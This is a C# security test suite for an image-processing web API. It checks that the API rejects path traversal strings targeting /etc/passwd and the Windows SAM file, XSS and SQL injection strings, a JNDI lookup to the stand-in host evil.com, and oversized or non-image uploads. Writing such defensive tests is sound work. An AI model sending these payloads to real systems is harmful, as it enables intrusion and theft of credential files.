using System.Net;
using System.Text;
using Microsoft.AspNetCore.Mvc.Testing;
using ImageGlider.WebApi.Tests.TestHelpers;

namespace ImageGlider.WebApi.Tests.Integration;

/// <summary>
/// API 安全性测试
/// </summary>
public class SecurityTests : WebApiTestBase
{
    public SecurityTests(WebApplicationFactory<Program> factory) : base(factory)
    {
    }
    
    [Theory]
    [InlineData("../../../etc/passwd")] // Unix 路径遍历
    [InlineData("..\\..\\..\\windows\\system32\\config\\sam")] // Windows 路径遍历
    [InlineData("/etc/passwd")] // 绝对路径
    [InlineData("C:\\Windows\\System32\\config\\sam")] // Windows 绝对路径
    [InlineData("file://etc/passwd")] // 文件协议
    [InlineData("\\\\server\\share\\file.txt")] // UNC 路径
    public async Task FileUpload_WithPathTraversalAttempt_ShouldRejectRequest(string maliciousPath)
    {
        // Arrange
        var maliciousFile = WebTestHelper.CreateTestFormFile(maliciousPath, 100, 100);
        var fields = new Dictionary<string, string>
        {
            ["Width"] = "50",
            ["Height"] = "50",
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(maliciousFile, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
    }
    
    [Theory]
    [InlineData("script.js")] // JavaScript 文件
    [InlineData("malware.exe")] // 可执行文件
    [InlineData("document.pdf")] // PDF 文件
    [InlineData("data.txt")] // 文本文件
    [InlineData("archive.zip")] // 压缩文件
    [InlineData("stylesheet.css")] // CSS 文件
    [InlineData("config.xml")] // XML 文件
    public async Task FileUpload_WithNonImageFile_ShouldRejectRequest(string fileName)
    {
        // Arrange
        var nonImageContent = Encoding.UTF8.GetBytes("This is not an image file");
        var formFile = WebTestHelper.CreateFormFileFromBytes(fileName, nonImageContent, "application/octet-stream");
        
        var fields = new Dictionary<string, string>
        {
            ["Width"] = "100",
            ["Height"] = "100",
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(formFile, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
    }
    
    [Fact]
    public async Task FileUpload_WithOversizedFile_ShouldRejectRequest()
    {
        // Arrange - 创建一个超大的"图片"文件（模拟）
        var oversizedContent = new byte[50 * 1024 * 1024]; // 50MB
        // 填充一些数据以模拟真实文件
        for (int i = 0; i < oversizedContent.Length; i += 1024)
        {
            oversizedContent[i] = 0xFF;
        }
        
        var formFile = WebTestHelper.CreateFormFileFromBytes("huge_image.jpg", oversizedContent, "image/jpeg");
        
        var fields = new Dictionary<string, string>
        {
            ["Width"] = "100",
            ["Height"] = "100",
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(formFile, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        // 应该返回 413 (Request Entity Too Large) 或 400 (Bad Request)
        response.StatusCode.Should().BeOneOf(HttpStatusCode.RequestEntityTooLarge, HttpStatusCode.BadRequest);
    }
    
    [Theory]
    [InlineData("<script>alert('xss')</script>")] // XSS 脚本
    [InlineData("javascript:alert('xss')")] // JavaScript 协议
    [InlineData("data:text/html,<script>alert('xss')</script>")] // Data URI
    [InlineData("'; DROP TABLE users; --")] // SQL 注入
    [InlineData("${jndi:ldap://evil.com/a}")] // JNDI 注入
    [InlineData("{{7*7}}")] // 模板注入
    public async Task RequestParameters_WithMaliciousInput_ShouldSanitizeOrReject(string maliciousInput)
    {
        // Arrange
        var file = WebTestHelper.CreateTestFormFile("test.jpg", 100, 100);
        var fields = new Dictionary<string, string>
        {
            ["Width"] = maliciousInput, // 在宽度参数中注入恶意代码
            ["Height"] = "100",
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(file, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
        
        // 确保响应不包含恶意脚本
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("<script>");
        responseContent.Should().NotContain("javascript:");
        responseContent.Should().NotContain("alert(");
    }
    
    [Fact]
    public async Task FileUpload_WithMalformedMultipart_ShouldHandleGracefully()
    {
        // Arrange - 创建格式错误的 multipart 内容
        var malformedContent = new StringContent("--boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\n\r\nNOT_PROPER_MULTIPART_DATA", 
            Encoding.UTF8, "multipart/form-data");
        
        // Act
        var response = await Client.PostAsync("/api/resize", malformedContent);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
    }
    
    [Theory]
    [InlineData(-1)] // 负数
    [InlineData(0)] // 零
    [InlineData(int.MaxValue)] // 极大值
    [InlineData(10000)] // 超大尺寸
    public async Task ResizeParameters_WithInvalidDimensions_ShouldRejectRequest(int invalidDimension)
    {
        // Arrange
        var file = WebTestHelper.CreateTestFormFile("test.jpg", 100, 100);
        var fields = new Dictionary<string, string>
        {
            ["Width"] = invalidDimension.ToString(),
            ["Height"] = invalidDimension.ToString(),
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(file, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
    }
    
    [Theory]
    [InlineData(-1)] // 负数质量
    [InlineData(0)] // 零质量
    [InlineData(101)] // 超过100的质量
    [InlineData(1000)] // 极大质量值
    public async Task CompressParameters_WithInvalidQuality_ShouldRejectRequest(int invalidQuality)
    {
        // Arrange
        var file = WebTestHelper.CreateTestFormFile("test.jpg", 100, 100);
        var fields = new Dictionary<string, string>
        {
            ["Quality"] = invalidQuality.ToString()
        };
        
        var content = CreateMultipartContent(file, fields);
        
        // Act
        var response = await Client.PostAsync("/api/compress", content);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
    }
    
    [Fact]
    public async Task ConcurrentRequests_ShouldNotCauseRaceConditions()
    {
        // Arrange
        const int concurrentRequests = 10;
        var tasks = new List<Task<HttpResponseMessage>>();
        
        // Act - 同时发送多个请求，使用相同的文件名
        for (int i = 0; i < concurrentRequests; i++)
        {
            var file = WebTestHelper.CreateTestFormFile("concurrent_test.jpg", 100, 100);
            var fields = new Dictionary<string, string>
            {
                ["Width"] = "50",
                ["Height"] = "50",
                ["ResizeMode"] = "Stretch",
                ["Quality"] = "80"
            };
            
            var content = CreateMultipartContent(file, fields);
            tasks.Add(Client.PostAsync("/api/resize", content));
        }
        
        var responses = await Task.WhenAll(tasks);
        
        // Assert
        // 检查是否有任何响应表明发生了竞态条件
        foreach (var response in responses)
        {
            if (response.IsSuccessStatusCode)
            {
                var responseContent = await response.Content.ReadAsStringAsync();
                responseContent.Should().NotBeNullOrEmpty();
                // 响应应该是有效的 JSON
                responseContent.Should().Contain("{");
            }
            else
            {
                // 错误响应应该是客户端错误，而不是服务器内部错误
                ((int)response.StatusCode).Should().BeLessThan(500);
            }
        }
        
        // 清理响应
        foreach (var response in responses)
        {
            response.Dispose();
        }
    }
    
    [Fact]
    public async Task FileUpload_WithEmptyFile_ShouldRejectRequest()
    {
        // Arrange
        var emptyFile = WebTestHelper.CreateFormFileFromBytes("empty.jpg", Array.Empty<byte>(), "image/jpeg");
        var fields = new Dictionary<string, string>
        {
            ["Width"] = "100",
            ["Height"] = "100",
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(emptyFile, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
    }
    
    [Theory]
    [InlineData("image/svg+xml")] // SVG 可能包含脚本
    [InlineData("text/html")] // HTML 内容
    [InlineData("application/javascript")] // JavaScript
    [InlineData("text/xml")] // XML 内容
    public async Task FileUpload_WithDangerousContentType_ShouldRejectRequest(string dangerousContentType)
    {
        // Arrange
        var file = WebTestHelper.CreateFormFileFromBytes("test.jpg", 
            Encoding.UTF8.GetBytes("<script>alert('xss')</script>"), 
            dangerousContentType);
        
        var fields = new Dictionary<string, string>
        {
            ["Width"] = "100",
            ["Height"] = "100",
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(file, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
    }
    
    [Fact]
    public async Task ResponseHeaders_ShouldIncludeSecurityHeaders()
    {
        // Arrange
        var file = WebTestHelper.CreateTestFormFile("security_test.jpg", 100, 100);
        var fields = new Dictionary<string, string>
        {
            ["Width"] = "50",
            ["Height"] = "50",
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(file, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        // 检查安全相关的响应头
        response.Headers.Should().NotBeNull();
        
        // 检查是否设置了适当的缓存控制
        if (response.Headers.CacheControl != null)
        {
            // 敏感操作不应该被缓存
            response.Headers.CacheControl.NoCache.Should().BeTrue();
        }
        
        // 响应不应该包含敏感信息
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("password");
        responseContent.Should().NotContain("secret");
        responseContent.Should().NotContain("key");
        responseContent.Should().NotContain("token");
    }
    
    [Fact]
    public async Task ErrorResponses_ShouldNotLeakSensitiveInformation()
    {
        // Arrange - 发送一个会导致错误的请求
        var invalidFile = WebTestHelper.CreateFormFileFromBytes("invalid.jpg", 
            Encoding.UTF8.GetBytes("invalid image data"), 
            "image/jpeg");
        
        var fields = new Dictionary<string, string>
        {
            ["Width"] = "100",
            ["Height"] = "100",
            ["ResizeMode"] = "Stretch",
            ["Quality"] = "80"
        };
        
        var content = CreateMultipartContent(invalidFile, fields);
        
        // Act
        var response = await Client.PostAsync("/api/resize", content);
        
        // Assert
        AssertErrorResponse(response, HttpStatusCode.BadRequest);
        
        var responseContent = await response.Content.ReadAsStringAsync();
        
        // 错误响应不应该包含敏感的系统信息
        responseContent.Should().NotContain("C:\\"); // Windows 路径
        responseContent.Should().NotContain("/home/"); // Unix 路径
        responseContent.Should().NotContain("StackTrace"); // 堆栈跟踪
        responseContent.Should().NotContain("Exception"); // 异常详情
        responseContent.Should().NotContain("at System."); // .NET 堆栈跟踪
        responseContent.Should().NotContain("connectionString"); // 连接字符串
    }
}